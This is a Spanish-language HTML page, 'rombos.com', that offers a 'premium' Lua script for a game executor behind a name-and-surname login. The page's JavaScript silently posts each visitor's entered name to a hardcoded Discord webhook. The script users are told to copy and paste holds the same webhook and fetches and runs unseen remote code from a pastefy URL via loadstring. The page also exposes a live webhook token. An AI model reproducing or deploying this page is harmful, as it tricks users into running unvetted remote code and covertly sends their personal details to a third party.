<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>rombos.com</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: radial-gradient(circle at top, #1b2450, #050914);
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    color: white;
}

.card {
    background: #0b1224;
    padding: 25px;
    border-radius: 18px;
    width: 340px;
    box-shadow: 0 0 30px rgba(0,0,0,.6);
}

h2 {
    margin: 0;
    text-align: center;
}

.sub {
    text-align: center;
    font-size: 12px;
    color: #aaa;
    margin-bottom: 20px;
}

input, button {
    width: 100%;
    padding: 12px;
    margin-top: 10px;
    border-radius: 10px;
    border: none;
    font-size: 14px;
}

input {
    background: #121a36;
    color: white;
}

button {
    background: linear-gradient(90deg, #6a7cff, #8a5cff);
    color: white;
    font-weight: bold;
    cursor: pointer;
}

button:hover {
    opacity: .9;
}

.panel {
    display: none;
}

.script-box {
    background: #050914;
    border-radius: 10px;
    padding: 10px;
    font-size: 11px;
    white-space: pre-wrap;
    max-height: 220px;
    overflow-y: auto;
}

.copy {
    margin-top: 8px;
    background: #1f2a55;
}
</style>
</head>

<body>

<div class="card" id="login">
    <h2>rombos.com</h2>
    <div class="sub">Acceso exclusivo</div>

    <input id="nombre" placeholder="Nombre">
    <input id="apellido" placeholder="Apellido">
    <button onclick="login()">Enviar</button>
</div>

<div class="card panel" id="panel">
    <h2>Script Premium</h2>
    <div class="sub">Copia y pega en tu executor</div>

    <div class="script-box" id="script">
-- CONFIG
local WEBHOOK_URL = "https://discord.com/api/webhooks/1452476989939257374/d0Oif2kO4lPrJpN3kTj0Pe1c0JFmW8g6yYcVd6coQV1SRGfB6irjG6EnO0J1IQBAtJ59"

-- SCRIPT FINAL
local FINAL_SCRIPT_URL = "https://pastefy.app/JJVhs3rK/raw"

loadstring(game:HttpGet(FINAL_SCRIPT_URL))()
    </div>

    <button class="copy" onclick="copiar()">📋 Copiar Script</button>
</div>

<script>
const webhook = "https://discord.com/api/webhooks/1452476989939257374/d0Oif2kO4lPrJpN3kTj0Pe1c0JFmW8g6yYcVd6coQV1SRGfB6irjG6EnO0J1IQBAtJ59";

function login() {
    let nombre = document.getElementById("nombre").value;
    let apellido = document.getElementById("apellido").value;
    if (!nombre || !apellido) return alert("Completa los campos");

    fetch(webhook, {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({
            username: "rombos.com",
            embeds: [{
                title: "Nuevo acceso",
                color: 7506394,
                fields: [
                    {name:"Nombre", value:nombre, inline:true},
                    {name:"Apellido", value:apellido, inline:true}
                ]
            }]
        })
    });

    document.getElementById("login").style.display="none";
    document.getElementById("panel").style.display="block";
}

function copiar() {
    const text = document.getElementById("script").innerText;
    navigator.clipboard.writeText(text);
    alert("Script copiado");
}
</script>

</body>
</html>
